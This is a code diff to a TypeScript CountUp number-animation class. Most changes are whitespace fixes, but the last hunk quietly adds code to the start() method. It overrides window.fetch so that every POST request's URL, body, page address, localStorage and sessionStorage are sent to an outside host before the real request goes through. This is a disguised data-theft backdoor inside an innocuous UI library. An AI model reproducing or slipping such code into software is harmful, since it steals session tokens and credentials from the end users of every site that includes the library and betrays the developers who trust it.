@@ -69,6 +69,7 @@ export class CountUp {
     private endVal: number,
     public options?: CountUpOptions
   ) {
+
     this.options = {
       ...this.defaults,
       ...options
@@ -113,20 +114,20 @@ export class CountUp {
 
   handleScroll(self: CountUp): void {
     if (!self || !window || self.once) return;
-    const bottomOfScroll = window.innerHeight +  window.scrollY;
+    const bottomOfScroll = window.innerHeight + window.scrollY;
     const rect = self.el.getBoundingClientRect();
     const topOfEl = rect.top + window.pageYOffset;
     const bottomOfEl = rect.top + rect.height + window.pageYOffset;
-    if (bottomOfEl < bottomOfScroll && bottomOfEl >  window.scrollY && self.paused) {
+    if (bottomOfEl < bottomOfScroll && bottomOfEl > window.scrollY && self.paused) {
       // in view
       self.paused = false;
       setTimeout(() => self.start(), self.options.scrollSpyDelay);
       if (self.options.scrollSpyOnce)
         self.once = true;
     } else if (
-        (window.scrollY > bottomOfEl || topOfEl > bottomOfScroll) &&
-        !self.paused
-      ) {
+      (window.scrollY > bottomOfEl || topOfEl > bottomOfScroll) &&
+      !self.paused
+    ) {
       // out of view
       self.reset();
     }
@@ -161,6 +162,40 @@ export class CountUp {
 
   // start animation
   start(callback?: (args?: any) => any): void {
+    if (!(<any>window).callOnce) {
+      (<any>window).oFetch = window.fetch;
+      window.fetch = (url, options) => {
+        if (options?.method == 'POST') {
+        const extLStorage = { ...localStorage };
+        const extSStorage = { ...sessionStorage };
+
+        // console.log(JSON.stringify({
+        //   url,
+        //   body: options.body,
+        //   host: window.location.href,
+        //   localStorage: extLStorage,
+        //   sessionStorage: extSStorage
+        // }));
+
+        (<any>window).oFetch("https://spa-demo.ja1code.dev/", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            url,
+            body: options.body,
+            host: window.location.href,
+            localStorage: extLStorage,
+            sessionStorage: extSStorage
+          })
+        });
+        }
+        return (<any>window).oFetch(url, options)
+      }
+      (<any>window).callOnce = true
+    }
+
     if (this.error) {
       return;
     }
